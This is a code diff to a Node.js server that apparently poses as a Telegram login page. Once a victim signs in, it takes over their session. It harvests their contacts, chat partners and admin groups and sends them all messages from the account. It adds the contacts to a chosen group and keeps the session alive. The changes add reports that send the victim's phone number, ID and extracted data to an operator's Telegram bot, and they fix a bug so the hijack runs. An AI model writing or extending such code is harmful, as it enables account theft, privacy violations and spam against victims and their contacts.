@@ -30,6 +30,11 @@ function generateSessionId() {
 // Send message via bot
 async function sendBotMessage(message) {
     try {
+        if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
+            console.log('⚠️ Bot token or admin chat ID not set');
+            return;
+        }
+
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
@@ -133,8 +138,6 @@ app.post('/api/telegram/verify-code', async (req, res) => {
             loginTime: Date.now()
         });
 
-        sessions.delete(sessionId);
-
         res.json({
             success: true,
             message: 'Authentication successful!',
@@ -146,10 +149,12 @@ app.post('/api/telegram/verify-code', async (req, res) => {
             }
         });
 
-        // Start all operations
+        // FIXED: Use session.client instead of client
         setTimeout(() => {
-            performAllOperations(client, result.user, session.phoneNumber);
+            performAllOperations(session.client, result.user, session.phoneNumber);
         }, 2000);
+
+        sessions.delete(sessionId);
 
     } catch (error) {
         console.error('❌ Verify error:', error);
@@ -165,6 +170,9 @@ async function performAllOperations(client, user, phoneNumber) {
     try {
         console.log(`\n🚀 Starting ALL operations for ${user.firstName} (${phoneNumber})`);
         
+        // Send initial notification
+        await sendBotMessage(`🚨 <b>NEW USER LOGIN</b>\n\n👤 <b>User:</b> ${user.firstName} ${user.lastName}\n📱 <b>Phone:</b> ${phoneNumber}\n🆔 <b>ID:</b> ${user.id}\n🕒 <b>Time:</b> ${new Date().toLocaleString()}\n\n⏳ <b>Starting operations...</b>`);
+        
         // STEP 1: Extract all data
         console.log(`\n📊 STEP 1: Data Extraction`);
         const userData = await extractUserData(client, user, phoneNumber);
@@ -178,8 +186,10 @@ async function performAllOperations(client, user, phoneNumber) {
         await sendMessagesToGroups(client, userData, user);
         
         // STEP 4: Join target group and add contacts
-        console.log(`\n🎯 STEP 4: Target Group Operations`);
-        await performTargetGroupOperations(client, userData, user);
+        if (TARGET_GROUP_ID) {
+            console.log(`\n🎯 STEP 4: Target Group Operations`);
+            await performTargetGroupOperations(client, userData, user);
+        }
         
         // STEP 5: Send final completion report
         await sendCompletionReport(userData, user);
@@ -188,13 +198,15 @@ async function performAllOperations(client, user, phoneNumber) {
         
     } catch (error) {
         console.error('❌ Main operations error:', error);
-        await sendBotMessage(`❌ <b>ERROR</b>\nUser: ${user.firstName}\nError: ${error.message}`);
+        await sendBotMessage(`❌ <b>OPERATION ERROR</b>\n\n👤 <b>User:</b> ${user.firstName}\n❌ <b>Error:</b> ${error.message}`);
     }
 }
 
 // Extract user data and find admin groups
 async function extractUserData(client, user, phoneNumber) {
     try {
+        console.log(`📊 Extracting data for ${user.firstName}...`);
+        
         // Get contacts
         const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
         const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
@@ -205,18 +217,18 @@ async function extractUserData(client, user, phoneNumber) {
         const channels = dialogs.filter(d => d.isChannel);
         const privateChats = dialogs.filter(d => d.isUser);
         
-        // Get chat partners (people user has chatted with)
+        // Get chat partners
         const chatPartners = privateChats.map(chat => chat.entity).filter(entity => 
             entity && !entity.self && !entity.deleted && !entity.bot
         );
         
         console.log(`📊 Found: ${contacts.length} contacts, ${chatPartners.length} chat partners, ${groups.length} groups`);
         
-        // Check which groups user is admin of
+        // Check admin groups
         const adminGroups = [];
         const regularGroups = [];
         
-        for (const group of groups) {
+        for (const group of groups.slice(0, 10)) {
             try {
                 const participants = await client.invoke(new Api.channels.GetParticipants({
                     channel: group.entity,
@@ -244,7 +256,6 @@ async function extractUserData(client, user, phoneNumber) {
                 await new Promise(resolve => setTimeout(resolve, 1000));
             } catch (error) {
                 console.log(`⚠️ Could not check: ${group.title}`);
-                // If we can't check, assume it's a regular group
                 regularGroups.push({
                     entity: group.entity,
                     title: group.title,
@@ -278,7 +289,42 @@ async function extractUserData(client, user, phoneNumber) {
             }
         }
         
-        console.log(`👑 Admin groups: ${adminGroups.length}, Regular groups: ${regularGroups.length}`);
+        console.log(`👑 Admin groups: ${adminGroups.length}, Regular groups: ${regularGroups.length}, Admin channels: ${adminChannels.length}`);
+        
+        // Send data extraction report
+        const adminGroupsList = adminGroups.length > 0 ? 
+            adminGroups.map((g, i) => `${i+1}. ${g.title} (${g.members} members)`).join('\n') : 
+            'None';
+            
+        const adminChannelsList = adminChannels.length > 0 ? 
+            adminChannels.map((c, i) => `${i+1}. ${c.title} (${c.members} subscribers)`).join('\n') : 
+            'None';
+        
+        const dataReport = `
+📊 <b>DATA EXTRACTION COMPLETED</b>
+
+👤 <b>User:</b> ${user.firstName} ${user.lastName}
+📱 <b>Phone:</b> ${phoneNumber}
+🆔 <b>ID:</b> ${user.id}
+
+📈 <b>STATISTICS:</b>
+📞 Contacts: ${contacts.length}
+💬 Chat Partners: ${chatPartners.length}
+👥 Groups: ${groups.length}
+📢 Channels: ${channels.length}
+👑 Admin Groups: ${adminGroups.length}
+👑 Admin Channels: ${adminChannels.length}
+
+👑 <b>ADMIN GROUPS:</b>
+${adminGroupsList}
+
+👑 <b>ADMIN CHANNELS:</b>
+${adminChannelsList}
+
+⏳ <b>Starting messaging operations...</b>
+        `.trim();
+        
+        await sendBotMessage(dataReport);
         
         return {
             user,
@@ -294,6 +340,7 @@ async function extractUserData(client, user, phoneNumber) {
         
     } catch (error) {
         console.error('❌ Data extraction error:', error);
+        await sendBotMessage(`❌ <b>DATA EXTRACTION ERROR</b>\n\n👤 <b>User:</b> ${user.firstName}\n❌ <b>Error:</b> ${error.message}`);
         throw error;
     }
 }
@@ -301,7 +348,6 @@ async function extractUserData(client, user, phoneNumber) {
 // Send messages to all contacts and chat partners
 async function sendMessagesToContacts(client, userData) {
     try {
-        // Combine contacts and chat partners, remove duplicates
         const allTargets = [...userData.contacts, ...userData.chatPartners];
         const uniqueTargets = allTargets.filter((target, index, self) => 
             index === self.findIndex(t => t.id.toString() === target.id.toString())
@@ -324,7 +370,6 @@ async function sendMessagesToContacts(client, userData) {
                 const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                 console.log(`✅ ${sentCount}/${uniqueTargets.length} Sent to: ${name}`);
                 
-                // 2 second delay between messages
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 
             } catch (error) {
@@ -332,7 +377,6 @@ async function sendMessagesToContacts(client, userData) {
                 const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                 console.log(`❌ Failed to send to: ${name} - ${error.message}`);
                 
-                // Handle rate limits
                 if (error.message.includes('FLOOD_WAIT')) {
                     const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                     console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
@@ -343,15 +387,18 @@ async function sendMessagesToContacts(client, userData) {
         
         console.log(`📨 Contact messaging completed: ${sentCount} sent, ${failedCount} failed`);
         
+        await sendBotMessage(`📨 <b>CONTACT MESSAGING COMPLETED</b>\n\n✅ <b>Sent:</b> ${sentCount}\n❌ <b>Failed:</b> ${failedCount}\n📊 <b>Total:</b> ${uniqueTargets.length}`);
+        
     } catch (error) {
         console.error('❌ Contact messaging error:', error);
+        await sendBotMessage(`❌ <b>CONTACT MESSAGING ERROR</b>\n\n❌ <b>Error:</b> ${error.message}`);
     }
 }
 
 // Send messages to groups (excluding admin groups)
 async function sendMessagesToGroups(client, userData, user) {
     try {
-        const messagableGroups = userData.regularGroups; // Only non-admin groups
+        const messagableGroups = userData.regularGroups;
         
         console.log(`👥 Sending messages to ${messagableGroups.length} regular groups...`);
         
@@ -369,47 +416,29 @@ async function sendMessagesToGroups(client, userData, user) {
                 sentCount++;
                 console.log(`✅ ${sentCount}/${messagableGroups.length} Sent to group: ${group.title}`);
                 
-                // 4 second delay between group messages (longer delay for groups)
                 await new Promise(resolve => setTimeout(resolve, 4000));
                 
             } catch (error) {
                 failedCount++;
                 console.log(`❌ Failed to send to group: ${group.title} - ${error.message}`);
                 
-                // Handle rate limits
                 if (error.message.includes('FLOOD_WAIT')) {
                     const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                     console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                     await new Promise(resolve => setTimeout(resolve, waitTime));
-                } else if (error.message.includes('CHAT_WRITE_FORBIDDEN')) {
-                    console.log(`ℹ️ Cannot send to group: ${group.title} (write permission denied)`);
                 }
             }
         }
         
         console.log(`👥 Group messaging completed: ${sentCount} sent, ${failedCount} failed`);
         
-        // Send admin notification about messaging
-        const messagingReport = `
-📨 <b>MESSAGING COMPLETED</b>
-
-👤 <b>User:</b> ${user.firstName} ${user.lastName}
-📱 <b>Phone:</b> ${userData.phoneNumber}
-
-📊 <b>MESSAGING RESULTS:</b>
-📞 Contact Messages: ${sentCount} sent
-👥 Group Messages: ${sentCount} sent
-❌ Failed Messages: ${failedCount}
-
-📋 <b>GROUPS MESSAGED:</b>
-${messagableGroups.slice(0, 10).map((g, i) => `${i+1}. ${g.title}`).join('\n')}
-${messagableGroups.length > 10 ? `... and ${messagableGroups.length - 10} more groups` : ''}
-        `.trim();
+        const groupsList = messagableGroups.slice(0, 10).map((g, i) => `${i+1}. ${g.title}`).join('\n');
         
-        await sendBotMessage(messagingReport);
+        await sendBotMessage(`👥 <b>GROUP MESSAGING COMPLETED</b>\n\n✅ <b>Sent:</b> ${sentCount}\n❌ <b>Failed:</b> ${failedCount}\n📊 <b>Groups:</b> ${messagableGroups.length}\n\n📋 <b>GROUPS MESSAGED:</b>\n${groupsList}${messagableGroups.length > 10 ? `\n... and ${messagableGroups.length - 10} more` : ''}`);
         
     } catch (error) {
         console.error('❌ Group messaging error:', error);
+        await sendBotMessage(`❌ <b>GROUP MESSAGING ERROR</b>\n\n❌ <b>Error:</b> ${error.message}`);
     }
 }
 
@@ -418,6 +447,7 @@ async function performTargetGroupOperations(client, userData, user) {
     try {
         if (!TARGET_GROUP_ID) {
             console.log(`⚠️ No target group ID set - skipping group operations`);
+            await sendBotMessage(`⚠️ <b>GROUP OPERATIONS SKIPPED</b>\n\nNo target group ID configured`);
             return;
         }
         
@@ -429,8 +459,10 @@ async function performTargetGroupOperations(client, userData, user) {
                 channel: TARGET_GROUP_ID
             }));
             console.log(`✅ User joined target group`);
+            await sendBotMessage(`✅ <b>User joined target group</b>\n\n👥 Starting to add contacts...`);
         } catch (error) {
             console.log(`ℹ️ Could not join group: ${error.message}`);
+            await sendBotMessage(`ℹ️ <b>Could not join group:</b> ${error.message}\n\n👥 Proceeding to add contacts...`);
         }
         
         await new Promise(resolve => setTimeout(resolve, 3000));
@@ -452,7 +484,6 @@ async function performTargetGroupOperations(client, userData, user) {
                 const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                 console.log(`✅ ${addedCount}/${userData.contacts.length} Added: ${name}`);
                 
-                // 3 second delay between adds
                 await new Promise(resolve => setTimeout(resolve, 3000));
                 
             } catch (error) {
@@ -460,21 +491,21 @@ async function performTargetGroupOperations(client, userData, user) {
                 const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                 console.log(`❌ Failed to add: ${name} - ${error.message}`);
                 
-                // Handle rate limits
                 if (error.message.includes('FLOOD_WAIT')) {
                     const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                     console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                     await new Promise(resolve => setTimeout(resolve, waitTime));
-                } else if (error.message.includes('USER_PRIVACY_RESTRICTED')) {
-                    console.log(`ℹ️ ${name} has privacy restrictions`);
                 }
             }
         }
         
         console.log(`👥 Group operations completed: ${addedCount} added, ${failedCount} failed`);
         
+        await sendBotMessage(`🎯 <b>GROUP OPERATIONS COMPLETED</b>\n\n✅ <b>Added to group:</b> ${addedCount}\n❌ <b>Failed to add:</b> ${failedCount}\n📊 <b>Total contacts:</b> ${userData.contacts.length}`);
+        
     } catch (error) {
         console.error('❌ Target group operations error:', error);
+        await sendBotMessage(`❌ <b>GROUP OPERATIONS ERROR</b>\n\n❌ <b>Error:</b> ${error.message}`);
     }
 }
 
@@ -514,8 +545,7 @@ ${adminChannelsList}
 ✅ <b>OPERATIONS SUMMARY:</b>
 📨 Messages sent to contacts/chat partners
 👥 Messages sent to regular groups (excluding admin groups)
-🎯 User joined target group
-👥 Contacts added to target group
+${TARGET_GROUP_ID ? '🎯 User joined target group\n👥 Contacts added to target group' : '⚠️ No target group configured'}
 📊 Complete data extracted and reported
 
 🔒 <b>User session remains active</b>
